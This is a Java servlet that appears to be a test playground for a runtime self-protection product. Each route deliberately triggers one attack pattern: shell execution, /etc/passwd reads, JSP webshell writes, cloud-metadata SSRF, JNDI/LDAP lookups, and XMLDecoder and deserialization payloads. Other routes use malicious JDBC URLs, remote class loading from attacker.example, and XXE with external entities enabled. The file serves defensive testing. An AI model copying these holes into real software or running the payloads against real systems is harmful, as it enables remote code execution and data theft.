package io.ohmyrasp.playground.java8;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.StringReader;
import java.lang.management.ManagementFactory;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.server.RMIClassLoader;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.StandardMBean;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import javax.security.auth.login.AppConfigurationEntry;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.tools.JavaCompiler;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

@WebServlet(urlPatterns = "/rasp/*")
public final class Java8VulnerableServlet extends HttpServlet {
  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    try {
      route(request.getPathInfo(), response);
    } catch (IOException exception) {
      throw exception;
    } catch (ServletException exception) {
      throw exception;
    } catch (Exception exception) {
      throw new ServletException(exception);
    }
  }

  private static void route(String pathInfo, HttpServletResponse response) throws Exception {
    String path = pathInfo == null ? "/" : pathInfo;
    if ("/health".equals(path)) {
      send(response, "ok");
      return;
    }
    if ("/java8/normal".equals(path)) {
      runSafeCommand();
      parseXml("<root>safe</root>");
      send(response, "normal ok");
      return;
    }
    if ("/java8/command".equals(path)) {
      Process process = new ProcessBuilder("sh", "-c", "cat /etc/passwd").start();
      process.waitFor();
      send(response, "command attempted");
      return;
    }
    if ("/java8/command-shell".equals(path)) {
      Process process = new ProcessBuilder("sh", "-c", "echo safe; id").start();
      process.waitFor();
      send(response, "command shell attempted");
      return;
    }
    if ("/java8/deserialization".equals(path)) {
      Class<?> type = Class.forName("com.sun.rowset.JdbcRowSetImpl");
      Object value = type.newInstance();
      deserialize(serialize(value));
      send(response, "deserialization attempted");
      return;
    }
    if ("/java8/file-read".equals(path)) {
      FileInputStream input = new FileInputStream("/etc/passwd");
      input.close();
      send(response, "file read attempted");
      return;
    }
    if ("/java8/file-write".equals(path)) {
      File dir = new File("/tmp/webapps/ROOT");
      if (!dir.exists() && !dir.mkdirs()) {
        throw new IOException("could not create test webroot");
      }
      FileOutputStream output = new FileOutputStream(new File(dir, "shell.jsp"));
      output.write("<% out.println(\"ok\"); %>".getBytes("UTF-8"));
      output.close();
      send(response, "file write attempted");
      return;
    }
    if ("/java8/ssrf-metadata".equals(path)) {
      new URL("http://169.254.169.254/latest/meta-data/").openConnection();
      send(response, "ssrf metadata attempted");
      return;
    }
    if ("/java8/ssrf-loopback".equals(path)) {
      new URL("http://127.0.0.1:8080/manager/html").openConnection();
      send(response, "ssrf loopback attempted");
      return;
    }
    if ("/java8/archive-traversal".equals(path)) {
      ZipEntry entry = new ZipEntry("../../webapps/ROOT/shell.jsp");
      entry.getName();
      FileOutputStream output = new FileOutputStream("/tmp/archive-shell.jsp");
      output.write("blocked".getBytes("UTF-8"));
      output.close();
      send(response, "archive traversal attempted");
      return;
    }
    if ("/java8/jdbc-h2".equals(path)) {
      try {
        DriverManager.getConnection("jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1/poc.sql'");
      } catch (SQLException expected) {
        send(response, "jdbc h2 attempted");
        return;
      }
      send(response, "jdbc h2 completed");
      return;
    }
    if ("/java8/jdbc-derby".equals(path)) {
      try {
        DriverManager.getConnection(
            "jdbc:derby:memory:test;create=true;init=CALL SQLJ.INSTALL_JAR('http://127.0.0.1/payload.jar','APP.PAYLOAD',0)");
      } catch (SQLException expected) {
        send(response, "jdbc derby attempted");
        return;
      }
      send(response, "jdbc derby completed");
      return;
    }
    if ("/java8/jdbc-mysql".equals(path)) {
      try {
        DriverManager.getConnection(
            "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
      } catch (SQLException expected) {
        send(response, "jdbc mysql attempted");
        return;
      }
      send(response, "jdbc mysql completed");
      return;
    }
    if ("/java8/classloader".equals(path)) {
      URLClassLoader loader =
          new URLClassLoader(new URL[] {new URL("http://attacker.example/evil.jar")});
      loader.close();
      send(response, "classloader attempted");
      return;
    }
    if ("/java8/rmi-classloader".equals(path)) {
      try {
        RMIClassLoader.loadClass("http://attacker.example/Exploit", "example.RemoteExploit");
      } catch (ClassNotFoundException expected) {
        send(response, "rmi classloader attempted");
        return;
      }
      send(response, "rmi classloader completed");
      return;
    }
    if ("/java8/script".equals(path)) {
      ScriptEngine engine = scriptEngine();
      engine.eval("Java.type('java.lang.Runtime').getRuntime().exec('id')");
      send(response, "script attempted");
      return;
    }
    if ("/java8/compile".equals(path)) {
      compile(
          "EvilCompile",
          "public class EvilCompile { void run() throws Exception { java.lang.Runtime.getRuntime().exec(\"id\"); } }");
      send(response, "compile attempted");
      return;
    }
    if ("/java8/jaas".equals(path)) {
      Map<String, String> options = new HashMap<String, String>();
      options.put("user.provider.url", "ldap://java-chains:50389/x");
      options.put("useFirstPass", "true");
      new AppConfigurationEntry(
          "com.sun.security.auth.module.JndiLoginModule",
          AppConfigurationEntry.LoginModuleControlFlag.REQUIRED,
          options);
      send(response, "jaas attempted");
      return;
    }
    if ("/java8/jmx-remote-config".equals(path)) {
      invokeJmx(
          "addNetworkConnector",
          new Object[] {"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"},
          new String[] {String.class.getName()});
      send(response, "jmx remote config attempted");
      return;
    }
    if ("/java8/jmx-file-write".equals(path)) {
      invokeJmx(
          "copyTo",
          new Object[] {"/opt/activemq/webapps/admin/shelljfr.jsp"},
          new String[] {String.class.getName()});
      send(response, "jmx file write attempted");
      return;
    }
    if ("/java8/xml-decoder-runtime".equals(path)) {
      try {
        decodeXml(xmlDecoderRuntimePayload());
      } catch (ArrayIndexOutOfBoundsException expected) {
        // XMLDecoder can finish the side-effecting object graph and then find no root object.
      }
      send(response, "xml decoder runtime attempted");
      return;
    }
    if ("/java8/xml-decoder-webshell".equals(path)) {
      try {
        decodeXml(xmlDecoderWebshellPayload());
      } catch (ArrayIndexOutOfBoundsException expected) {
        // XMLDecoder can finish the side-effecting object graph and then find no root object.
      }
      send(response, "xml decoder webshell attempted");
      return;
    }
    if ("/java8/jndi".equals(path)) {
      System.setProperty("com.sun.jndi.ldap.connect.timeout", "200");
      System.setProperty("com.sun.jndi.ldap.read.timeout", "200");
      try {
        new InitialContext().lookup("ldap://127.0.0.1:1389/Exploit");
      } catch (NamingException expected) {
        send(response, "jndi attempted");
        return;
      }
      send(response, "jndi lookup completed");
      return;
    }
    if ("/java8/xxe-file".equals(path)) {
      parseXml(
          "<?xml version=\"1.0\"?>"
              + "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
              + "<root>&xxe;</root>");
      send(response, "xxe attempted");
      return;
    }
    response.setStatus(HttpServletResponse.SC_NOT_FOUND);
    send(response, "not found");
  }

  private static void runSafeCommand() throws IOException, InterruptedException {
    Process process = new ProcessBuilder("/bin/true").start();
    process.waitFor();
  }

  private static byte[] serialize(Object value) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    ObjectOutputStream output = new ObjectOutputStream(bytes);
    output.writeObject(value);
    output.close();
    return bytes.toByteArray();
  }

  private static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException {
    ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes));
    try {
      return input.readObject();
    } finally {
      input.close();
    }
  }

  private static ScriptEngine scriptEngine() {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
    if (engine == null) {
      throw new IllegalStateException("JavaScript engine unavailable");
    }
    return engine;
  }

  private static void compile(String className, String source) {
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    if (compiler == null) {
      throw new IllegalStateException("Java compiler unavailable");
    }
    JavaCompiler.CompilationTask task =
        compiler.getTask(
            null,
            null,
            null,
            Arrays.asList("-d", "/tmp"),
            null,
            Arrays.asList(new StringJavaSource(className, source)));
    task.call();
  }

  private static void invokeJmx(String operation, Object[] arguments, String[] signatures)
      throws Exception {
    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    ObjectName name =
        new ObjectName("ohmyrasp.java8:type=ServletBroker,name=n" + System.nanoTime());
    StandardMBean mbean = new StandardMBean(new ServletBroker(), ServletBrokerMBean.class);
    server.registerMBean(mbean, name);
    try {
      server.invoke(name, operation, arguments, signatures);
    } finally {
      if (server.isRegistered(name)) {
        server.unregisterMBean(name);
      }
    }
  }

  private static Object decodeXml(String payload) {
    XMLDecoder decoder = new XMLDecoder(new ByteArrayInputStream(payload.getBytes()));
    Object value = decoder.readObject();
    decoder.close();
    return value;
  }

  private static String xmlDecoderRuntimePayload() {
    return "<java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">"
        + "<void class=\"java.lang.ProcessBuilder\">"
        + "<array class=\"java.lang.String\" length=\"3\">"
        + "<void index=\"0\"><string>sh</string></void>"
        + "<void index=\"1\"><string>-c</string></void>"
        + "<void index=\"2\"><string>id</string></void>"
        + "</array>"
        + "<void method=\"start\"/>"
        + "</void>"
        + "</java>";
  }

  private static String xmlDecoderWebshellPayload() {
    return "<java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">"
        + "<object class=\"java.io.PrintWriter\">"
        + "<string>/tmp/webapps/ROOT/shell.jsp</string>"
        + "</object>"
        + "</java>";
  }

  private static void parseXml(String xml)
      throws ParserConfigurationException, IOException, SAXException {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setNamespaceAware(true);
    factory.setExpandEntityReferences(true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", true);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "all");
    factory.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
  }

  private static void send(HttpServletResponse response, String text) throws IOException {
    response.setContentType("text/plain;charset=UTF-8");
    response.getWriter().println(text);
  }

  public interface ServletBrokerMBean {
    String addNetworkConnector(String value);

    String copyTo(String path);
  }

  public static final class ServletBroker implements ServletBrokerMBean {
    @Override
    public String addNetworkConnector(String value) {
      return value;
    }

    @Override
    public String copyTo(String path) {
      return path;
    }
  }

  private static final class StringJavaSource extends SimpleJavaFileObject {
    private final String source;

    StringJavaSource(String className, String source) {
      super(URI.create("string:///" + className + ".java"), Kind.SOURCE);
      this.source = source;
    }

    @Override
    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
      return source;
    }
  }
}
